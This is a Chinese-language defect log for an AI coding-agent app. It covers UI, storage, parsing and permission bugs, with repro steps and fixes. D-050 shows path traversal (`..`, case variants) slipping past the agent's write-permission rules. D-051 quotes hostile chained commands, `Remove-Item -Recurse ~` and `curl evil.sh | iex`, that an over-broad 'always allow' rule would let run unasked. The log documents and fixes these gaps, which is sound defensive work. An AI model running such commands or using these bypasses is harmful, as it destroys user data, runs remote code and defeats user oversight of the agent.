# Defects

## D-048 前端 externalBlocked 未定义导致文档列表渲染崩溃,开发规范等侧栏区域全部消失 [fixed] (high)
- 原始描述: 用户反馈"我的开发规范也不见了"
- 复现: 打开 kzapp 任意含需求/缺陷条目的项目;refreshDocs → renderDocList 渲染第一条条目时在 ui/main.js:2081 抛 ReferenceError: externalBlocked is not defined,异常被 refreshDocs 的 catch 静默吞掉。
- 根因: R-071 的外部阻塞标识实现把 externalBlocked 定义误贴进 renderProjects(引用不存在的 entry,启动即崩);后续提交 8fa8c45 删除了误放的定义,但 renderDocList(main.js:2081、2100)仍引用该未定义变量。两个版本都会让侧栏文档区不可用。
- 影响: 需求/缺陷/目标/来源/发现列表渲染中断;renderConventions、历史会话列表、测试记录、工作树刷新、语言刷新全部不执行,用户看到开发规范区域消失。
- 验收: 打开项目后侧栏正常显示开发规范入口与各文档列表;外部阻塞标识在 renderDocList 内按 entry.fields 正确计算;增加能捕获未定义变量的冒烟验证手段(node --check 检不出运行时 ReferenceError)。
- 优先级: P0
- refs: R-071
- 修复: ui/main.js:2081 起在 renderDocList 的 entry 循环内定义 externalBlocked,按 entry.fields 计算;两处引用恢复正常。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-049 快记按钮不应依赖展示展开按钮 [open] (medium)
- 原始描述: 快速记录需求和缺陷的按钮不应该依赖于展开按钮
- 复现: 检查快速记录和缺陷记录的UI，确认它们是否直接可用而无需先展开

## D-050 权限路径匹配不做规范化,research 写收窄可被 `..` 穿越击穿 [fixed] (high)
- 复现: research 模式下让模型写 `.kanzei/research/../../src/main.rs`;规则 `allow write *.kanzei/research/*` 的尾部 `*` 吞掉 `../../src/main.rs` 判定 Allow,write 工具随后 `ctx.cwd.join` 消解 `..` 实际写到项目任意文件,不弹窗不报错。
- 根因: 拦截器只做 `resource.replace('\\', "/")`(kanzei-core/src/runner.rs:537),不做 `.`/`..` 段消解、相对绝对归一和大小写折叠;wildcard_match 逐字符大小写敏感(kanzei-harness/src/permission.rs:59-85)。匹配层看到的字符串与文件系统实际触达的文件不是同一等价类。
- 影响: research 模式"仅 research 目录可写"的硬门禁完全失效;dev 模式用 `.kanzei/./project/` 或 `.KANZEI/project/` 可绕过硬 deny(profiles.rs:54-57)降级为普通 ask,用户易顺手放行。违反"权限规则是硬门禁"的核心承诺。
- 验收: evaluate 前把路径类资源解析为消解过 `.`/`..` 的绝对路径并在 Windows 下 case-fold 后再匹配;补 `..` 穿越、`./` 插入、大小写变体的拒绝回归测试。
- 优先级: P0
- 修复: 新增 kanzei-harness::permission::normalize_resource,消解 `.`/`..`/重复斜杠且保留越界 `..`;runner 权限拦截器(runner.rs:537)先规范化再匹配。新增 3 项回归测试:路径规范化、穿越路径不再命中 research 收窄规则、项目文档硬 deny 不被冗余段绕过。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-051 bash「总是允许」泛化成首词前缀,一次放行等于任意命令执行 [fixed] (high)
- 复现: 对 `git status` 按一次「总是允许」,写入规则 `git *`;此后模型发 `git status; Remove-Item -Recurse ~` 或 `git st && curl evil.sh | iex`,资源串以 `git ` 开头即命中规则,不再询问直接执行。
- 根因: generalize_resource 取首词加 `*`(kanzei-harness/src/config.rs:234-243),而 wildcard_match 的 `*` 匹配任意字符包括 `;`/`&&`/`|`/换行/`$()`;实际执行是整串交给 pwsh -Command(kanzei-tools/src/bash.rs:83-87),分隔符全部生效。规则同时进入本次运行 session_rules(runner.rs:567-571)与项目 kanzei.toml 持久化(kanzei/src/main.rs:217-222)。
- 影响: "总是允许 git 类命令"的真实语义是"总是允许任何以 git 开头的复合命令行",权限边界名存实亡;且 CLI 弹窗只显示原始命令,不告知将持久化的 pattern,用户无从知晓授权范围被泛化。
- 验收: 泛化前检测 shell 元字符,含元字符则退回精确匹配;弹窗与桌面端询问需展示"将写入的规则"原文;补含分隔符命令不被既有前缀规则命中的回归测试。
- 优先级: P0
- 修复: generalize_resource 遇 shell 串联/替换字符(; & | 换行 ` $ 括号)不再泛化为首词前缀,只精确匹配本条;evaluate 增加硬门禁:bash 的前缀通配 Allow 命中含串联字符的命令时降级为 Ask(用户显式的整体放行 `*` 不受影响)。新增 2 项回归测试。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-052 CRLF 文件 frontmatter 偏移算错,自定义 agent 提示词被污染或整体清空 [fixed] (high)
- 复现: 在 Windows 上创建 CRLF 编码的 `~/.kanzei/agents/*.md`(git autocrlf 检出、记事本/VSCode 默认均为 CRLF),加载该 agent 后观察 system prompt。
- 根因: kanzei-harness/src/markdown.rs:44-68 用 `line.len() + 1` 逐行累加 body_start,但 `str::lines()` 剥掉的是 `\r\n` 两个字节,每行少算 1 字节;n 个 frontmatter 键累计欠 n+2 字节,落点回退进收尾 `---` 行甚至上一行。n=1 正文变 `-\r\n正文`,n=3~5 整个分隔符混入正文;落点若切在多字节 UTF-8 字符中间(frontmatter 值含中文时常见),`text.get(body_start..)` 返回 None,:66 的 `.unwrap_or("")` 让 body 直接变空。
- 影响: 用户自定义 agent/command 的提示词被静默加前缀、混入分隔符或整体丢失,无任何告警,行为异常极难归因。Windows 是主平台,现有测试(markdown.rs:183)只覆盖 `\n` 故未暴露。
- 验收: 按字节定位收尾 `---` 的真实偏移,不用 lines() 重建;补 CRLF + 中文 frontmatter + 多键的解析回归测试,断言 body 与 LF 版本完全一致。
- 优先级: P0
- 修复: parse_frontmatter 改为按剩余文本真实字节逐行切分,不再用 lines() 重建偏移;新增 crlf_与_lf_解析结果一致 测试覆盖 1~6 个键 + 中文值,断言 body 非空、不残留分隔符且与 LF 版本一致。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-053 上下文压缩重试在工具循环中段产生孤儿 tool_result,恢复请求被 API 400 拒绝 [open] (high)
- 复现: 长工具循环(大文件读取、grep 结果堆积)中触发上下文超限,step ≥ 2 时进入压缩重试。
- 根因: compact_messages_for_retry 用 `rposition(|m| m.role == Role::User)` 找"当前用户消息"并原样保留(kanzei-core/src/runner.rs:757-787),但工具结果按 Anthropic 语义也是 User 角色(kanzei-llm/src/request.rs:72-78),工具循环中最后一条 User 消息正是 tool_results。压缩后对应的 assistant ToolCall 消息已被清空,留下无配对 tool_use 的 tool_result;build_body 原样透传不做配对修复(protocol/anthropic.rs:93-104),API 返回 400 invalid_request,该错误不含超限关键词故不被 is_overflow_message 识别,直接上抛导致整次运行失败。compact_messages_aggressively(789-798)同样问题。
- 影响: D-042 的上下文超限恢复在其最常见场景下不生效,超限直接变成运行失败,用户看到的是费解的 invalid_request 而非超限提示。单测 compact_retry_keeps_prompt_and_bounded_tool_history(runner.rs:840-859)只构造了最后一条为纯文本 user 消息的用例,掩盖了此缺陷。
- 验收: 压缩时把末尾 ToolResult 消息降级为纯文本摘要,或回找最后一条纯文本 User 消息;补"工具循环中段触发超限"的回归测试,断言重建请求不含孤儿 tool_result。
- 优先级: P0
- refs: D-042

## D-054 用户拒绝权限时丢弃同批已执行工具结果,历史留未配对 ToolCall 永久毒化会话 [open] (high)
- 复现: 一次运行中对任意权限询问点「拒绝」,随后在同一会话继续对话。
- 根因: 工具批次结果累积在局部 results,全部执行完才 push(kanzei-core/src/runner.rs:476-618);Gate::UserDeclined 分支在 runner.rs:589 直接 return,results 被整体丢弃,包括同批排在前面、已实际执行且有副作用的工具结果。返回的 messages 最后一条是含 Part::ToolCall 的 assistant 消息且无 tool_results 跟随,而调用方无条件把该历史当 prior 复用(kanzei-app/src/main.rs:3097-3101/2984/3052、kanzei/src/main.rs:280/145/262)。
- 影响: 拒绝后会话永久损坏,后续每次请求都因 "tool_use ids were found without tool_result blocks" 返回 400,用户只能弃掉会话;同批已执行工具(如已写盘的 edit)的结果既未进历史也未喂给模型,模型对已发生的副作用一无所知,续跑时可能重复执行。
- 验收: 拒绝时为每一个 ToolCall 补配对 ToolResult(已执行的用真实结果,被拒与未执行的用取消占位),push 后再返回;补"拒绝后继续对话"的回归测试。
- 优先级: P0

## D-055 后台进程的权限询问被前端会话过滤器丢弃,运行永久挂死 [open] (high)
- 复现: 项目 A 进程 1 为当前活动会话并正在运行;进程 2(或另一项目)的后台运行触发权限询问。
- 根因: 前端 on() 对非活动会话的所有事件一刀切丢弃(ui/main.js:6-15),kz:ask 也在其中(main.js:950);后端 emit 后即 `receiver.await` 挂起等答复(src/main.rs:2973-2979),answer_ask(2132-2135)是唯一消费路径,无重发机制,切回页签时也不重放 pending asks,后端亦无"列出 pending asks"命令。自动放行逻辑位于过滤器之后同样救不了。
- 影响: 弹窗永不出现,该运行卡在权限等待直到手动停止,用户毫无感知(无日志无提示)。R-030/R-078 主打的多进程/多项目并行在任何需要审批的场景实际不可用,只有 yolo/自动放行才真并行。
- 验收: ask/done/error/stopped 等控制类事件按 sessionId 路由到对应进程状态而非丢弃;切回进程时补发 pending ask;后端提供 pending asks 查询以支持重建。
- 优先级: P0
- refs: R-030 R-078

## D-056 运行中切换项目后 running 永不复位,UI 永久卡在运行中 [open] (high)
- 复现: 项目 A 运行中(running=true)→ 点击侧栏切到项目 B → B 显示"运行中"、发送按钮禁用、状态栏金色,永久卡住。
- 根因: 项目点击 handler 不调 setRunning(ui/main.js:1942-1955);renderProcesses 把 activeSessionId 换成 B 的会话(1802-1810),A 的 kz:done 带 A 的 sessionId 被 on() 过滤丢弃(894-905),setRunning(false)(905)永不执行;此时 B 的进程 tab 就是 activeProcessId,点它命中 1833-1834 早退也无法修复,唯一出路是点停止(仅本地复位)。
- 影响: 多项目并行的基本操作(运行时切项目)导致 UI 状态永久错乱。反向情况:若 B 的 session_id 为空,过滤条件 `sessionId && activeSessionId` 不成立,A 的 kz:text 会直接串流渲染进 B 的对话区。
- 验收: 运行状态按会话维度保存并在切换项目/进程时按目标会话重算;控制类事件不因非活动会话被丢弃;补切项目后运行结束能正确复位的验证。
- 优先级: P0
- refs: D-055 R-078
- 进展: 已修主路径:renderProcesses 在活动进程身份变化时按后端真实 running 重算运行态,项目切换时先复位为空闲;不再永久卡在"运行中"。根因(on() 对控制类事件一刀切丢弃)属架构级,随 R-086 处理。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-057 队列 drain 循环变量遮蔽导致排队输入顺序反转并重复入库 [fixed] (high)
- 复现: 运行中排队两条输入 X(先)、Y(后);本轮结束进入 drain,状态栏提示"开始执行排队输入(X)",实际执行的是 Y,X 的内容延后到再下一轮。
- 根因: kanzei-app/src/main.rs:2685 用 `let next_input = {...}` 新建绑定遮蔽了 2643 行的外层变量,promote 出的输入被丢弃;2707 只做 `next_prompt = input.prompt.clone()`(clone 暗示本想存回)。下一轮 run_task 收到 promoted_input=None → is_new_input=true → 以相同文本重新 admit(2852-2876),而 store 的 promote_next_input 按 FIFO 弹出最早的 pending(store.rs:400-427),弹出的是 Y 而非刚 admit 的 X'。
- 影响: 队列执行顺序反转违背"依次执行"承诺;每条排队输入被重复写入 prompt.admitted/promoted 事件,事件溯源里 input_id 张冠李戴;重新 admit 时沿用首条消息的 delivery,排队 steer 输入的交付模式被改写。
- 验收: 2707 处改为 `next_input = Some(input);` 并去掉 2685 的 let;补"排队两条输入按提交顺序执行且不重复 admit"的回归测试。
- 优先级: P0
- 修复: main.rs:2685 改为写回外层 next_input(去掉遮蔽的 let),取用处改 next_input.clone();promote 出的输入不再被丢弃,队列按提交顺序执行且不重复 admit。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-058 会话 ID 读写路径 canonical 化不一致,历史对话与运行数据互相不可见 [fixed] (high)
- 复现: 正常使用即触发。运行若干轮后重启应用,历史恢复为空;历史对话列表、轨迹回放读不到内容;点"新对话"后下一轮仍带旧上下文。
- 根因: 运行/写侧统一走 normalized_project_root(canonicalize,Windows 返回 `\\?\C:\...`),而读侧 workspace_snapshot(main.rs:875-877)、conversation_clear(2244-2246)、conversation_get(2274-2276)、conversation_trace_get(2297-2299)、conversation_list(2331-2333)、conversation_delete(2395-2397)仍用裸 discover_project_root;project_session_id 对路径 lowercase 哈希但不剥 `\\?\` 前缀(kanzei-core/src/store.rs:19-27),两侧算出的 session_id 必然不同。二阶错乱:process_session_id 里 default_process_id 用当前函数的 root,前端 activeProcessId 来自 canonical 的 process_list,传入非 canonical 命令时默认进程被误判为非默认,再挂 `#d` 后缀,与运行侧 base 三重错位。
- 影响: 重启恢复、历史列表、轨迹回放读空;conversation_clear 清的是错误 session 的投影和错误 runtime 的内存(2259-2264),运行侧内存历史不受影响;工作区卡片的 status/conversation 与 pending(走 canonical 的 list_pending_inputs)在同一张卡里来自两个不同 session。
- 说明: fc51205(D-046)只把 run_prompt/admit/stop 侧换成 normalized_project_root,conversation_* 与 workspace_snapshot 未同步,属该修复的遗漏面。
- 验收: 读侧统一改用 normalized_project_root;补"写入后立即按前端路径读回"的回归测试覆盖 conversation_get/list/clear 与 workspace_snapshot。
- 优先级: P0
- refs: D-046 D-038
- 修复: conversation_clear/get/trace_get/list/delete 五处与 workspace_snapshot 统一改用 normalized_project_root,与运行/写入侧同源;历史恢复、清空、删除、工作区卡片不再落到另一个会话。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-059 webfetch/websearch 大小写转换后字节偏移错位,可致 panic 与脏文本 [open] (high)
- 复现: 用 webfetch 抓取含 U+0130 'İ'(土耳其语页面几乎必含)或 U+1E9E 'ẞ' 的页面。
- 根因: kanzei-tools/src/webfetch.rs:118-137 先 `html.to_lowercase()`,再用 `html.char_indices()` 的字节偏移去切 `lower[i..]`,并把在 lower 中 find 到的位置直接当原文坐标。to_lowercase 会改变部分字符的字节长度(İ 2→3 字节,ẞ 3→2 字节),此后两串坐标永久错位;错位点若落在 lower 的多字节字符中间,`lower[i..]` 直接 panic("byte index is not a char boundary")。
- 影响: webfetch 在 async 上下文内 panic(不像 read/grep 有 spawn_blocking 兜底),会 unwind 掉整个 agent turn;websearch 的 title/snippet 复用同一函数同样中招。research 模式主力工具存在内容依赖型崩溃。
- 验收: 改为在原文上做大小写不敏感匹配(或建立 lower→原文的偏移映射);补含 İ/ẞ 的 HTML 解析测试,断言不 panic 且 script/style 区间正确跳过。
- 优先级: P0

## D-060 docstore 解析丢弃非规范行,tracker 整文件重写会静默销毁用户手改内容 [open] (high)
- 复现: 在 requirements.md 手写一条无冒号 bullet(如 `- 就是个备注`)或自由段落/### 子标题/代码块,随后让模型执行任意一次 req/defect 写操作(哪怕改的是别的条目),手改内容消失。
- 根因: kanzei-tools/src/docstore.rs:225-242 的 parse 只保留 `## ` 标题和 `- key: value` 形式 bullet(`bullet.split_once(':')` 无 else 分支),其余一律丢弃;render(301-318)只写回保留部分。而 tracker.rs:76-82/153/227/268 的每一个写操作(add/update/close/reorder)都是 load → 改内存 → save 整文件重写。
- 影响: 数据静默丢失,无任何提示;与 docstore 模块头"用户可任意编辑器手改"及"文档永远写不坏"的设计承诺直接相反——引擎恰恰是唯一会删内容的一方。当前仓库文件全部合规是因为都由引擎生成,掩盖了该缺陷。
- 验收: parse 保留未识别行的原文与位置,save 时原样回写;补"手写自由文本 + 一次 add 后内容不丢"的回归测试。
- 优先级: P0

## D-061 OAuth 凭证无锁读改写且非原子覆盖,与官方 CLI 共享文件可致登录态失效 [open] (high)
- 复现: 两个 kanzei 进程(或 kanzei 与 Claude Code CLI)在令牌过期窗口内并发发起请求。
- 根因: kanzei-llm/src/auth/claude.rs:28-95、auth/codex.rs:20-101 的流程是 read_to_string → 判断过期 → POST 刷新 → `std::fs::write` 覆盖,无文件锁、无 tmp+rename 原子替换、无写前重读。这两个文件(~/.claude/.credentials.json、~/.codex/auth.json)同时被官方 CLI 读写。
- 影响: 双方各自用同一 refresh_token 刷新,而 OAuth 轮换 refresh token,后到者 invalid_grant,且先到者写入的新 token 可能被并发方以旧内容覆盖回去,登录态永久失效并殃及官方 CLI,需手动重新登录;truncate-then-write 中途崩溃会留下半截 JSON,下次解析直接报"请重新登录"。access token 约 1 小时一刷,窗口频繁。
- 验收: 刷新前后加文件锁,写入改为写临时文件再 rename 原子替换,写前重读校验;补并发刷新不互相覆盖的测试。
- 优先级: P1

## D-062 bash 超时丢弃全部已捕获输出且标记为成功 [fixed] (high)
- 复现: 执行一条会超时的命令(如测试跑到 119s 已打印几百行失败详情后卡住),观察工具返回。
- 根因: kanzei-tools/src/bash.rs:102-159 把 out_buf/err_buf 声明在 capture async 块内部(104),`tokio::time::timeout` 超时走 Err 分支(150)时整个 future 连同两个缓冲一起 drop,只返回一句 "timeout: true"(155),而超时前进程可能已产出接近 1 MiB 输出。
- 影响: 模型对"命令卡在哪、已经跑到哪一步"零信息,只能盲目加大 timeout 重跑并重复副作用;且用 ToolOutput::ok 返回,语义上把超时标记为成功,上层按成功统计。对照 Claude Code/opencode:超时均回传已捕获的部分输出。
- 验收: 超时时回传已捕获的 stdout/stderr 并明确标注被截断与超时原因,返回值改为错误语义;补超时保留部分输出的测试。
- 优先级: P1
- 修复: stdout/stderr 缓冲移到 capture future 外,超时时回传已捕获的部分输出并标注 [partial stdout/stderr before timeout];超时改为 ToolOutput::error(不再标记为成功),display 增加 timeout 字段。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-063 移动端桥接 Content-Length 未 trim,POST /v1/messages 恒 400 [fixed] (medium)
- 复现: 用任何标准客户端(curl/reqwest/OkHttp)向本机桥接 POST /v1/messages。
- 根因: kanzei-app/src/main.rs:1836-1846 用 `strip_prefix("content-length:")` 后直接 `parse::<usize>()`;标准头是 `Content-Length: 123`,冒号后带空格,strip 后剩 `" 123"`,而 str::parse 不接受前导空白 → 恒回退 0 → body 为空 → serde_json 解析失败 → unwrap_or_default 得 Null → thread_id 缺失 → 400(1873-1887)。
- 影响: 移动端上行消息通道完全不可用(GET 端点不受影响)。R-059 声称的"双向 message 接口"其中一向从未工作过。
- 验收: 改为 `value.trim().parse()`;补带标准头的 POST 请求解析测试。
- 优先级: P1
- refs: R-059
- 修复: Content-Length 解析改为 value.trim().parse();POST /v1/messages 可正常读取 body。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-064 SQLite 未启用 WAL/busy_timeout,并发写导致丢事件与假失败 [fixed] (medium)
- 复现: 同项目两个进程并行运行且几乎同时收尾;或运行收尾瞬间前端正在轮询 list_pending_inputs/conversation_list。
- 根因: kanzei-core/src/store.rs:89-98 打开连接后只设 `PRAGMA foreign_keys`,未设 busy_timeout(默认 0,锁冲突立即返回 SQLITE_BUSY)也未启用 WAL;而实际使用模式是同进程大量短命连接并发读写同一 state.db(kanzei-app 每个命令、移动端 HTTP 线程各自 open)。另 append_event_tx 的 `SELECT MAX(sequence)+1` 在 DEFERRED 事务内,两连接并发 append 同一会话会读到相同 sequence,后提交者撞 UNIQUE(session_id, sequence)。run_task 尾部落库用 `?` 传播(main.rs:3059/3063-3093),任何一次 Busy 都让整个 run_task 返回 Err。
- 影响: 成功的运行被报告为"运行失败"且 conversation.updated 未写入,本轮成果既不在事件日志也不给 kz:done,重启后回退到上一轮;队列 admit 遇 Busy 时用户消息直接被拒;移动端事件写失败回 500。
- 验收: open 时统一设置 `journal_mode=WAL` 与 `busy_timeout`,对 UNIQUE 冲突做有限重试;run 尾部落库失败降级为可见告警而非整体 Err。
- 优先级: P1
- 修复: SessionStore::open 增加 busy_timeout(5s)、journal_mode=WAL、synchronous=NORMAL;并发读写不再直接 SQLITE_BUSY。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-065 通知 sequence 分配与插入非原子,INSERT OR IGNORE 吞掉冲突静默丢通知 [open] (medium)
- 复现: 同一会话/线程有两个并发通知源(如运行结束通知与状态通知同时落库)。
- 根因: kanzei-core/src/store.rs:192-199 的 next_notification_sequence(MAX+1 读取)与 173-190 的 append_notification 是两个独立公开方法,中间无事务包裹(调用方 kanzei-app/src/main.rs:2528-2540 先取后插);两个并发写入方对同一 thread_id 取到相同 sequence,而 INSERT OR IGNORE(178)会忽略任何约束冲突——既包括预期幂等的 event_id 主键,也包括 UNIQUE(thread_id, sequence)(502),第二条通知被静默丢弃,无错误无日志。
- 影响: 通知永久丢失且不可观测,移动端按 cursor 回放永远看不到。
- 验收: 在单个事务内完成 MAX+1 与插入;OR IGNORE 只用于 event_id 幂等重放,(thread_id, sequence) 冲突需报错或重算;补并发写入不丢通知的测试。
- 优先级: P1

## D-066 stop_run 不回写会话状态且绕过 lifecycle 锁,工作区永显运行中并可能丢输入 [fixed] (medium)
- 复现: ①任意一次手动停止后查看工作区视图,该项目永远显示"运行中";②在轮次交界或排队瞬间点停止,已 promote 未执行的输入永久丢失,或 pending 输入在下次手动发送时被抢先执行。
- 根因: kanzei-app/src/main.rs:2426-2511 的 stop_run 只做 handle.abort() + 清 asks + cancel_pending_inputs,从不 set_status;abort 在下一个 await 点杀死任务,写 idle/failed 的分支(3060-3093)永远执行不到。同时 stop_run 完全不取 runtime.lifecycle 锁(D-024 只串行化了 admit 与 drain 收尾),存在两个窗口:drain 已 promote X 后 stop 只清 pending,X 永久停留 promoted 静默丢单;队列分支持锁 admit 后 stop 并发置 running=false,孤儿 pending 在下次发送时被 FIFO 抢先执行("旧输入复活")。
- 影响: 工作区状态与进程页签的内存标志互相矛盾;移动端通知流缺失终态;停止语义不完整,丢输入或旧输入延迟复活。
- 验收: stop_run 取 lifecycle 锁后再 abort 与清理,补写 set_status("idle") 与状态事件,并回收 promoted 未执行的输入;补停止后状态与队列一致性的测试。
- 优先级: P1
- refs: D-024
- 修复: stop_run 取 lifecycle 锁后再 abort 与清理,并补写 set_status("idle") 与 session.status_changed 事件;工作区不再显示幽灵运行,停止与 drain/admit 不再交错。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-067 anthropic 协议遇未知 content_block 类型直接杀流 [open] (medium)
- 复现: Anthropic 侧响应中出现新的 block 类型(已有先例:server_tool_use、web_search_tool_result),或 OAuth beta 通道服务端注入新块。
- 根因: kanzei-llm/src/protocol/anthropic.rs:169-173 的 content_block_start 对未知 type 兜底返回 `Err(LlmError::Protocol)`;而同文件 262-264 对未知 SSE 事件只 tracing::debug 忽略——同一宽容原则没有贯彻到 block 类型。官方明确要求客户端忽略未知类型。
- 影响: 响应流中途报错,本轮已生成内容作废。属前向兼容炸弹,服务端一旦推新类型即"所有请求全挂"。
- 验收: 未知 block 类型改为记录并忽略;补含未知 block 的流解析测试,断言不中断且已知内容完整。
- 优先级: P1

## D-068 错误分类忽略 kind,限流可被误判为上下文超限触发破坏性压缩 [open] (medium)
- 复现: provider 在流内返回带 token 字样的限流/配额错误;或任何 429/529。
- 根因: kanzei-llm/src/error.rs:34-57 的 classify_provider 完全忽略 kind(流内 error 事件走此路径),只对 message 做宽泛子串匹配,词表含 "token limit"、"too many tokens"、"input_tokens" 这类会出现在配额文案中的模式,命中后 kind(如 rate_limit_error)被丢弃归为 ContextOverflow;runner 对 overflow 的响应是原地压缩消息历史再重试(runner.rs:268-284)。同时 LlmError 没有 RateLimited/Overloaded 变体,429/529 落为普通 Http 直接终止,retry-after 头被无视,client 重试只覆盖建流前的 connect/timeout(client.rs:142)。
- 影响: 误判时无谓压缩掉真实对话历史后重试,限流未解除则二次失败而历史已受损;正常限流没有退避重试,长跑 agent 一遇 TPM 峰值即整轮失败。
- 验收: classify_provider 先按 kind 判定再回落文本匹配;新增限流错误分类并按 retry-after 退避重试;补限流不触发压缩的回归测试。
- 优先级: P1
- refs: R-075

## D-069 websearch snippet 偏移链丢失一级基址,产出脏文本且可能 panic [fixed] (medium)
- 复现: 任意一次 websearch,观察返回的 snippet 内容。
- 根因: kanzei-tools/src/websearch.rs:143-153 的第三个闭包中 offset 是 shadowing 后的 G,但切片基址写成 `title_end + 4 + G + 1`,丢掉了第一级基址 A,起点比正确位置提前 A 字节,落在 `<a class="result__snippet"...>` 开标签内部。
- 影响: 每条搜索结果的 snippet 都带 `snippet">` 类垃圾前缀喂给模型;若错位起点落在多字节字符(中文摘要前的非 ASCII href)中间则直接 panic。本文件测试只断言 url/title 未断言 snippet,故漏网。
- 验收: 修正基址累加链;补断言 snippet 内容正确的测试,并覆盖含中文摘要的 HTML。
- 优先级: P2
- 修复: snippet 抽取改为逐级把基址累进 rest,不再丢失 result__snippet 一级偏移;补断言 snippet 内容的测试与中文摘要不 panic 的测试。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-070 docstore 标题尾部方括号被无条件剥为 status,不做枚举校验 [fixed] (medium)
- 复现: `req add "支持 vec[index] 语法"` 或标题含 `[DONE]`;入库时 title 完整,下次 load 被解析成 title="支持 vec"、status="index]"。
- 根因: kanzei-tools/src/docstore.rs:264-270 的 status 剥离没有白名单校验(而紧邻的 severity 剥离有,257 行,正是 D-002 的修复方式);又因 transition_allowed 对未知 from 状态放行(219),后续 update 不报错,错误状态永久固化并显示在 index 注入里。
- 影响: 标题静默损坏并产生非法状态。与已修复的 D-001/D-002 同族,修复未对称应用到 [status]。
- 验收: status 剥离加合法状态白名单校验,不匹配则视为标题的一部分;补含方括号标题的解析测试。
- 优先级: P2
- 修复: status 剥离增加合法状态白名单校验(与 severity 对称);新增 title_with_brackets_survives_roundtrip 测试,覆盖 vec[index]、[DONE] 帧与合法状态仍正常剥离。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-071 grep/glob 默认跳过隐藏文件,项目核心文档搜不到 [fixed] (medium)
- 复现: 在项目根用 grep 搜索 defects.md 中的原文,或用 glob 匹配 `.kanzei/**`,均返回无结果。
- 根因: kanzei-tools/src/grep.rs:92 与 glob.rs:75 使用 `ignore::WalkBuilder::new(base).build()` 默认配置,默认 hidden(true) 过滤所有点开头目录/文件。另 grep.rs:112 的 `let _ = searcher.search_path(...)` 把搜索错误整个吞掉,该文件剩余部分静默缺失。
- 影响: 系统性假阴性——模型会得出"文件不存在/无匹配"的错误结论,而本项目的需求/缺陷/规范文档恰好全在 .kanzei/ 隐藏目录下;.github/、.claude/ 同样不可见。
- 验收: 默认包含隐藏文件(仍尊重 .gitignore),或提供显式开关并在结果中说明;grep 的文件级错误需上报而非吞掉;补搜索 .kanzei 下内容能命中的测试。
- 优先级: P2
- 修复: grep 与 glob 的 WalkBuilder 均设 hidden(false),仍尊重 .gitignore;.kanzei/、.github/、.claude/ 下内容可被检索。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-072 process_update 的 model 为 null 时无法清除模型覆盖 [fixed] (medium)
- 复现: 给某进程选一个具体模型,再把下拉切回"模型:agent 默认",发起运行——界面显示默认,实际仍以旧覆盖模型运行,且无法通过 UI 恢复默认。
- 根因: 前端 `model: $("model-select").value || null`(ui/main.js:1618-1624)在选空时发 null;后端 `model: Option<String>` 把 None 当"不修改"(src/main.rs:548-550),真正能清除覆盖的 Some("") 永远发不出;run_prompt 的 `model.or_else(|| process.model...)`(2613-2614)回落到进程上残留的旧覆盖。
- 影响: 每进程独立模型选择在"恢复默认"这一路径上失效,只能删掉进程重建。
- 验收: 清除时发空串或引入显式 clear 语义;补切回默认后运行使用 agent 默认模型的验证。
- 优先级: P2
- refs: R-030
- 修复: 前端选"agent 默认"时改发空串(后端已按空串清除覆盖),不再发 null 被当作"不修改"。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-073 模型下拉跨进程串值,每进程独立模型选择在 UI 上泄漏 [fixed] (medium)
- 复现: 在进程 p2 选模型 X,切回默认进程,下拉仍显示 X 且发送时直接传 X。
- 根因: ui/main.js:1618-1624 把选择同时写入全局 localStorage `kz-model`;switchProcess(1847)只在目标进程显式设过 model 时才覆盖下拉,否则保留上一个进程的显示值。
- 影响: R-030 承诺的"每进程独立模型选择"在 UI 流程上不成立,用户会在不知情下用错模型跑任务。
- 验收: 模型下拉按进程回显(未设置则显示 agent 默认),全局 localStorage 仅作新进程的初始值;补切换进程后下拉与实际使用模型一致的验证。
- 优先级: P2
- refs: R-030 D-072
- 修复: switchProcess 改为 `$("model-select").value = target.model || ""`,未设覆盖时回到 agent 默认,不再保留上一个进程的选择。
- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。

## D-074 前端 5 类静默失败:附件丢失、设置页白屏、启动链中断、快记内容丢失、系统通知永不弹 [open] (medium)
- 复现: ①粘贴截图不写文字点发送→附件 chip 消失什么也没发生;②配置损坏时打开设置页→空表单无提示;③projects_get 失败→启动后半段全不执行,状态栏停在初始态;④快记写完提交失败→表单已销毁内容找不回;⑤等长任务完成→系统通知从不出现。
- 根因: ①send() 在 sendText 前就清空 attachments(ui/main.js:1436-1446),而 sendText 的 `if (!prompt) return`(1264-1266)静默吞掉——该函数注释自己写着"任何拒绝发送的理由都要说出来,绝不静默(D-004)";②loadSettings(2956-2957)首行 invoke 无 try/catch;③启动 IIFE(3156-3162)的 invoke 在 try 块外;④快记 submit 先 form.remove() 再 await invoke(2459-2473),失败时输入已随表单销毁(对照目标新建表单 2530-2544 失败保留);⑤全项目从未调用 Notification.requestPermission,permission 恒为 default,`=== "granted"` 条件恒 false(175-181)。
- 影响: 五处都表现为"点了没反应",用户无从判断是卡了还是失败了;其中 ① ④ 直接丢失用户输入。
- 验收: 五处分别补明确反馈——附件无文字时给出提示或允许纯附件发送;设置页与启动链 invoke 失败时可见报错;快记失败保留表单内容;首次需要通知时请求权限并在被拒时说明。
- 优先级: P2
- refs: D-004
